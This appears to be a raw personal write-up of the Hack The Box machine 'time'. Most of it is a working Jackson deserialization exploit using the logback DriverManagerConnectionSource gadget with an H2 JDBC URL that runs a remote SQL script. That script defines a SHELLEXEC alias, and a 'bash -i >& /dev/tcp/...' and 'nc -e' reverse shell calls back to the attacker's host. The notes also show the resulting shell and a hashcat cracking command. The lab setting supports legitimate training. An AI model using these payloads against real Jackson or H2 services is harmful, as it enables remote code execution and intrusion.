



# time

```bash
nmap -sC -sV 10.129.32.8
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 00:21 UTC
Nmap scan report for ip-10-129-32-8.ec2.internal (10.129.32.8)
Host is up (0.083s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: No content to map due to end-of-input

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'ture': was expecting 'null', 'true', 'false' or NaN

Validation failed: 
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'microtaskDebounce': was expecting ('true', 'false' or 'null')

Validation failed: 
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'w': was expecting ('true', 'false' or 'null')

Validation failed: 
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'w': was expecting ('true', 'false' or 'null')

Validation failed: 
Unhandled Java exception: 
com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), 
expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object



Payload:Validation failed: 
Unhandled Java exception: 
com.fasterxml.jackson.databind.JsonMappingException: URL format error; 
must be "jdbc:h2:{ {.|mem:}[name] | [file:]fileName | {tcp|ssl}:[//]server[:port][,server2[:port]]/name }[;key=value...]" 
but is  "jdbc:h2:tcp://10.10.14.50:8989" [90046-199] (through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource["connection"])


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://10.10.14.50/"}]

Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException: 
Connection is broken: "java.net.ConnectException: Connection refused (Connection refused): 10.10.14.50" [90067-199] (through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource["connection"])



Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException: 
No suitable driver found for jdbc:tcp://10.10.14.50/ (through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource["connection"])


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://10.10.14.50/"}]

$ nc -vv -l 10.129.32.8 -p 9000


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce\", {"url":"jdbc:h2:tcp://10.129.32.8/"}]"

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character ('u' (code 117)): was expecting comma to separate Array entries

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character ('\' (code 92)): expected a valid value (number, String, array, object, 'true', 'false' or 'null')


Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: 
Could not resolve type id 'ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce' as a subtype of [simple type, class java.lang.Object]: no such class found


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce\", {"url":"jdbc:h2:tcp://10.129.32.8/"}]"
# Validation successful!


"["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:9000/inject.sql'"}]"


# setup the web page

python -m SimpleHTTPServer 9000 # py2
python3 -m http.server 9000

http://0.0.0.0:9000/


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:9000/inject.sql'"}]"
# Validation successful!


"["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:9000/inject.sql'"}]"


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]
# running for long time
# Validation failed: 2020-10-31 01:59:30 command: slow query: 118 ms


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"}]
# Validation failed: 2020-10-31 01:56:26 lock: 3 shared read lock unlock SYS


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://0.0.0.0:9000/inject.sql'"}]
# Validation failed: 2020-10-31 01:53:53 lock: 3 shared read lock unlock SYS

"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://0.0.0.0:9000/inject.sql'"}]"
# Validation successful!

"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"}]"
# Validation successful!


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"}]
# Validation failed: 2020-10-31 02:09:42 lock: 3 shared read lock unlock SYS


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]"

["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]
# CALL SHELLEXEC('nc 10.10.14.50 9000')
# Validation failed: 2020-10-31 02:28:18 command: slow query: 641 ms
# Validation failed: 2020-10-31 02:31:47 command: slow query: 632 ms
# Validation failed: 2020-10-31 02:33:06 command: slow query: 647 ms
# Validation failed: 2020-10-31 02:33:06 command: slow query: 647 ms


# htbox        >  my kali 2424
# 10.129.32.8     10.10.14.50


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]
# CALL SHELLEXEC('nc 10.10.14.50 2424 –e /bin/bash')
# CALL SHELLEXEC('nc -e /bin/sh 10.10.14.50 2424')
# host:
# $ nc -vv -l 0.0.0.0 -p 2424
# 0.0.0.0: inverse host lookup failed: Unknown host
# listening on [any] 2424 ...
# invalid connection to [10.10.14.50] from ip-10-129-32-8.ec2.internal [10.129.32.8] 58842
# htb:
# Validation failed: 2020-10-31 02:43:35 lock: 3 exclusive write lock requesting for SYS


# inject.sql:
bash -i >& /dev/tcp/10.10.14.50/2424 0>&1

# host:
nc -lvp 2424
listening on [any] 2424 ...
connect to [10.10.14.50] from ip-10-129-32-8.ec2.internal [10.129.32.8] 58866
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ 




hashcat -m 1400 -a 0 -o 10790631378d0d5e0d85e40ca7f23a17 /usr/share/wordlists/rockyou.txt

```


```
require 'java'
Dir["./classpath/*.jar"].each do |f|
    require f
end
java_import 'com.fasterxml.jackson.databind.ObjectMapper'
java_import 'com.fasterxml.jackson.databind.SerializationFeature'

content = ARGV[0]

puts "Mapping"
mapper = ObjectMapper.new
mapper.enableDefaultTyping()
mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false);
puts "Serializing"
obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters
puts "objectified"
puts "stringified: " + mapper.writeValueAsString(obj)
```


```sql
-- CREATE ALIAS SHELLEXEC
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\A");
    return s.hasNext() ? s.next() : "";  }
$$;

-- CALL ALIAS SHELLEXEC with iput
CALL SHELLEXEC('id > exploited.txt')
```



---

ref
- [Abusing H2 Database ALIAS](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
- [java.vul](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [On Jackson CVEs: Don’t Panic — Here is what you need to know](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
- [CVE](https://www.cvedetails.com/cve/CVE-2017-7525/)
- [$$](https://stackoverflow.com/questions/12144284/what-are-used-for-in-pl-pgsql)





.

